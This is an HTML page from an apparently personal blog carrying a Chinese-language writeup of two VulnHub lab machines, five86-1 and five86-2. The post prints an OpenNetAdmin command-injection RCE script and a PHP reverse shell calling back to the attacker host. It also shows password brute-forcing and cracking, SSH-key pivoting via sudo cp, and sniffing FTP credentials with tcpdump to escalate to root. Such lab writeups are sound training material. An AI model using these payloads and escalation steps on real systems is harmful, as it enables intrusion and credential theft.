@@ -1,0 +1,866 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="靶机渗透,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="今天搞了两个简单的靶机，不太长，就写在一篇里了 five86-1arp-scan开路  靶机ip：172.20.10.143 攻击机ip：172.20.10.135 nmap开扫  开了22，10000端口，但是很奇怪，直接访问80端口也是有服务的，可能是抽风了 先看10000端口，是webmin 1.920，搜一波洞看看能不能直接打，找到了一个RCE洞，但是利用失败 接着看80端口，扫一下目录，">
+<meta name="keywords" content="靶机渗透">
+<meta property="og:type" content="article">
+<meta property="og:title" content="five86-1&#x2F;2 writeup">
+<meta property="og:url" content="http://yoursite.com/2020/02/14/five86/index.html">
+<meta property="og:site_name" content="Moyu&#39;s blog">
+<meta property="og:description" content="今天搞了两个简单的靶机，不太长，就写在一篇里了 five86-1arp-scan开路  靶机ip：172.20.10.143 攻击机ip：172.20.10.135 nmap开扫  开了22，10000端口，但是很奇怪，直接访问80端口也是有服务的，可能是抽风了 先看10000端口，是webmin 1.920，搜一波洞看看能不能直接打，找到了一个RCE洞，但是利用失败 接着看80端口，扫一下目录，">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://yoursite.com/2020/02/14/five86/image-20200215212158781.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/14/five86/image-20200215212426957.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/14/five86/image-20200215214513392.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/14/five86/image-20200215220920374.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/14/five86/image-20200215221925611.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/14/five86/image-20200215222034937.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/14/five86/image-20200215222149613.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/14/five86/image-20200215222402649.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/14/five86/image-20200214183227445.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/14/five86/image-20200214183924269.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/14/five86/image-20200214184450004.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/14/five86/image-20200214184922973.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/14/five86/image-20200214192129724.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/14/five86/image-20200214193354698.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/14/five86/image-20200214193940204.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/14/five86/image-20200214195550602.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/14/five86/image-20200214200001668.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/14/five86/image-20200214203057021.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/14/five86/image-20200214204826116.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/14/five86/image-20200214204944347.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/14/five86/image-20200214205030482.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/14/five86/image-20200214205154017.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/14/five86/image-20200214205405871.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/14/five86/image-20200214205456760.png">
+<meta property="og:updated_time" content="2020-02-15T14:25:22.766Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="five86-1&#x2F;2 writeup">
+<meta name="twitter:description" content="今天搞了两个简单的靶机，不太长，就写在一篇里了 five86-1arp-scan开路  靶机ip：172.20.10.143 攻击机ip：172.20.10.135 nmap开扫  开了22，10000端口，但是很奇怪，直接访问80端口也是有服务的，可能是抽风了 先看10000端口，是webmin 1.920，搜一波洞看看能不能直接打，找到了一个RCE洞，但是利用失败 接着看80端口，扫一下目录，">
+<meta name="twitter:image" content="http://yoursite.com/2020/02/14/five86/image-20200215212158781.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/02/14/five86/">
+
+
+
+
+
+  <title>five86-1/2 writeup | Moyu's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Moyu's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/14/five86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Moyu">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/wlp.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Moyu's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">five86-1/2 writeup</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-02-14T17:32:38+08:00">
+                2020-02-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  1.3k
+                </span>
+              
+
+              
+
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>今天搞了两个简单的靶机，不太长，就写在一篇里了</p>
+<h2 id="five86-1"><a href="#five86-1" class="headerlink" title="five86-1"></a>five86-1</h2><p>arp-scan开路</p>
+<p><img src="image-20200215212158781.png" alt="image-20200215212158781"></p>
+<p>靶机ip：172.20.10.143</p>
+<p>攻击机ip：172.20.10.135</p>
+<p>nmap开扫</p>
+<p><img src="image-20200215212426957.png" alt="image-20200215212426957"></p>
+<p>开了22，10000端口，但是很奇怪，直接访问80端口也是有服务的，可能是抽风了</p>
+<p>先看10000端口，是webmin 1.920，搜一波洞看看能不能直接打，找到了一个RCE洞，但是利用失败</p>
+<p>接着看80端口，扫一下目录，扫的时候发现80端口访问不了了，无奈重启靶机</p>
+<p>重启之后再扫一波，robots.txt，里边有一个路径/ona，进去看到是个oa系统</p>
+<p><img src="image-20200215214513392.png" alt="image-20200215214513392"></p>
+<p>搜一波漏洞</p>
+<p>ona = v18.1.1 同样有个rce，exp搜一波直接打进去了，很神奇，<a href="https://www.exploit-db.com/exploits/47691" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/47691</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> Exploit Title: OpenNetAdmin 18.1.1 - Remote Code Execution</span><br><span class="line"><span class="meta">#</span> Date: 2019-11-19</span><br><span class="line"><span class="meta">#</span> Exploit Author: mattpascoe</span><br><span class="line"><span class="meta">#</span> Vendor Homepage: http://opennetadmin.com/</span><br><span class="line"><span class="meta">#</span> Software Link: https://github.com/opennetadmin/ona</span><br><span class="line"><span class="meta">#</span> Version: v18.1.1</span><br><span class="line"><span class="meta">#</span> Tested on: Linux</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> Exploit Title: OpenNetAdmin v18.1.1 RCE</span><br><span class="line"><span class="meta">#</span> Date: 2019-11-19</span><br><span class="line"><span class="meta">#</span> Exploit Author: mattpascoe</span><br><span class="line"><span class="meta">#</span> Vendor Homepage: http://opennetadmin.com/</span><br><span class="line"><span class="meta">#</span> Software Link: https://github.com/opennetadmin/ona</span><br><span class="line"><span class="meta">#</span> Version: v18.1.1</span><br><span class="line"><span class="meta">#</span> Tested on: Linux</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>!/bin/bash</span><br><span class="line"></span><br><span class="line">URL="http://172.20.10.143/ona/"</span><br><span class="line">while true;do</span><br><span class="line"> echo -n "$ "; read cmd</span><br><span class="line"> curl --silent -d "xajax=window_submit&amp;xajaxr=1574117726710&amp;xajaxargs[]=tooltips&amp;xajaxargs[]=ip%3D%3E;echo \"BEGIN\";$&#123;cmd&#125;;echo \"END\"&amp;xajaxargs[]=ping" "$&#123;URL&#125;" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
+
+<p>可以看到成功getshell</p>
+<p><img src="image-20200215220920374.png" alt="image-20200215220920374"></p>
+<p>但是是个低权限的www-data用户，没啥用，找找有什么可用的文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -type f -user www-data</span><br></pre></td></tr></table></figure>
+
+<p>在/var/www/html/reports路径下找到了.htaccess，里边有一个路径/var/www/.htpasswd，查看得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">douglas:$apr1$9fgG/hiM$BtsL9qpNHUlylaLxk81qY1</span><br></pre></td></tr></table></figure>
+
+<p>得到了用户名和hash，还有一句提示</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># To make things slightly less painful (a standard dictionary will likely fail),</span><br><span class="line"># use the following character set for this 10 character password: aefhrt</span><br></pre></td></tr></table></figure>
+
+<p>成了，生成字典开始跑吧</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch 10 10 aefhrt &gt; password.txt</span><br></pre></td></tr></table></figure>
+
+<p>然后用john去爆破，得到密码fatherrrrr</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=password.txt hash.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20200215221925611.png" alt="image-20200215221925611"></p>
+<p>ssh连接进去，sudo -l查看可用sudo的命令</p>
+<p><img src="image-20200215222034937.png" alt="image-20200215222034937"></p>
+<p>说明接下来要搞jen用户了，但是只有cp命令能搞到jen用户，经过思考(搜索)，可以用ssh密钥来搞</p>
+<p>生成ssh 密钥</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -b 2048</span><br></pre></td></tr></table></figure>
+
+<p>将公钥复制到/tmp下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /home/douglas/.ssh/id_rsa.pub /tmp/authorized_keys</span><br></pre></td></tr></table></figure>
+
+<p>然后复制到jen用户下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">chmod 777 authorized_keys</span><br><span class="line">sudo -u jen /bin/cp authorized_keys /home/jen/.ssh/</span><br></pre></td></tr></table></figure>
+
+<p>直接ssh连接jen就好了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh jen@127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<p>登进去看到提示有一个mail，在/var/mail下翻到了这个</p>
+<p><img src="image-20200215222149613.png" alt="image-20200215222149613"></p>
+<p>看这个内容应该是给了moss的密码Fire!Fire!，试一下，成功登录</p>
+<p>然后找moss的suid文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /home -type f -perm -u=s 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p>有一个/home/moss/.games/upyourgame，运行一下就是root了</p>
+<p><img src="image-20200215222402649.png" alt="image-20200215222402649"></p>
+<h2 id="five86-2"><a href="#five86-2" class="headerlink" title="five86-2"></a>five86-2</h2><p>先扫一下靶机</p>
+<p><img src="image-20200214183227445.png" alt="image-20200214183227445"></p>
+<p>靶机ip：172.20.10.144</p>
+<p>攻击机ip：172.20.10.135</p>
+<p>然后nmap开扫</p>
+<p><img src="image-20200214183924269.png" alt="image-20200214183924269"></p>
+<p>开放了21端口，80端口，而且可以看出来是wordpress站</p>
+<p>先搞21端口，发现需要登录，放弃</p>
+<p>然后看80端口，进去看到显示不完全，再点击login，发现跳转到了域名five86-2，很简单，改一下host就好了</p>
+<p><img src="image-20200214184450004.png" alt="image-20200214184450004"></p>
+<p>这样进去再看就好了，既然是wordpress的站，那wpscan开扫</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url 172.20.10.144 -e u</span><br></pre></td></tr></table></figure>
+
+<p>得到了几个用户</p>
+<p><img src="image-20200214184922973.png" alt="image-20200214184922973"></p>
+<p>看一看前台功能，基本没功能，那就是后台爆破了，wpscan继续打，命令类似这样</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url 172.20.10.144 -U peter -P /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p>经过漫长的爆破，然后爆出来了barney的密码spooky1</p>
+<p><img src="image-20200214192129724.png" alt="image-20200214192129724"></p>
+<p>还有stephen的密码 apollo1</p>
+<p><img src="image-20200214193354698.png" alt="image-20200214193354698"></p>
+<p>先用barney登一下看看，后台有几个插件</p>
+<p><img src="image-20200214193940204.png" alt="image-20200214193940204"></p>
+<p>去搜一下看看能不能利用插件的漏洞来getshell，找到了这个<a href="https://www.exploit-db.com/exploits/46981" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/46981</a></p>
+<p>根据上边的方法来getshell</p>
+<p>将其中的一句话木马改成反弹shell的php代码即可</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$sock=fsockopen(<span class="string">"172.20.10.135"</span>,<span class="number">7777</span>);</span><br><span class="line">$proc=proc_open(<span class="string">"/bin/sh -i"</span>, <span class="keyword">array</span>(<span class="number">0</span>=&gt;$sock, <span class="number">1</span>=&gt;$sock, <span class="number">2</span>=&gt;$sock),$pipes);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>成功反弹shell</p>
+<p><img src="image-20200214195550602.png" alt="image-20200214195550602"></p>
+<p>一般来讲，www-data用户的权限都比较低，所以直接更改用户，刚才爆破出的那两个来试一下，最后用stephen的密码 apllo1成功登录</p>
+<p><img src="image-20200214200001668.png" alt="image-20200214200001668"></p>
+<p>然后尝试换成交互式shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"import pty; pty.spawn('/bin/sh')"</span> &gt; /tmp/asdf.py</span><br><span class="line">python /tmp/asdf.py</span><br></pre></td></tr></table></figure>
+
+<p>提示没有python，那就试试python3，成功获取交互式shell    </p>
+<p>可以看到这个pcap很奇怪，然后试一下tcpdump，发现可以使用tcpdump，那就尝试抓包呗</p>
+<p>先用ip add来查看网卡</p>
+<p><img src="image-20200214203057021.png" alt="image-20200214203057021"></p>
+<p>然后抓包</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timeout 180 tcpdump -i veth9b9422b -w hack.pcap</span><br></pre></td></tr></table></figure>
+
+<p>等一会然后停止，再看这个文件，本来应该用wireshark分析，但是这里经过观察，这ftp是明文传输的，所以账号密码都写在脸上了</p>
+<p><img src="image-20200214204826116.png" alt="image-20200214204826116"></p>
+<p>得到了账号paul，密码esomepasswford，尝试登录</p>
+<p><img src="image-20200214204944347.png" alt="image-20200214204944347"></p>
+<p>看看这个用户有没有提权的方法</p>
+<p><img src="image-20200214205030482.png" alt="image-20200214205030482"></p>
+<p>paul可以用peter的service，那就直接用service起一个bash</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u peter /usr/sbin/service ../../bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>同样的操作再来一次</p>
+<p><img src="image-20200214205154017.png" alt="image-20200214205154017"></p>
+<p>这次终于可以用root的命令了，而且还是改密码，直接改了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u root passwd root</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20200214205405871.png" alt="image-20200214205405871"></p>
+<p>然后看flag就完事了</p>
+<p><img src="image-20200214205456760.png" alt="image-20200214205456760"></p>
+<p>总结一下，这靶机感觉比较刻意，难度不大，主要是多搜索就好了，需要爆破的靶机都是屑</p>
+<p>参考资料：</p>
+<p><a href="https://www.hacknos.com/five86-2-walkthrough-vulnhub-ctf/" target="_blank" rel="noopener">https://www.hacknos.com/five86-2-walkthrough-vulnhub-ctf/</a></p>
+<p><a href="https://mzfr.github.io/vulnhub-writeups/2020-01-09-five862" target="_blank" rel="noopener">https://mzfr.github.io/vulnhub-writeups/2020-01-09-five862</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/靶机渗透/" rel="tag"># 靶机渗透</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/02/11/hgame-2020-sekiro/" rel="next" title="hgame2020 sekiro writeup">
+                <i class="fa fa-chevron-left"></i> hgame2020 sekiro writeup
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/wlp.jpg" alt="Moyu">
+            
+              <p class="site-author-name" itemprop="name">Moyu</p>
+              <p class="site-description motion-element" itemprop="description">hack for fun</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">31</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#five86-1"><span class="nav-number">1.</span> <span class="nav-text">five86-1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#five86-2"><span class="nav-number">2.</span> <span class="nav-text">five86-2</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Moyu</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
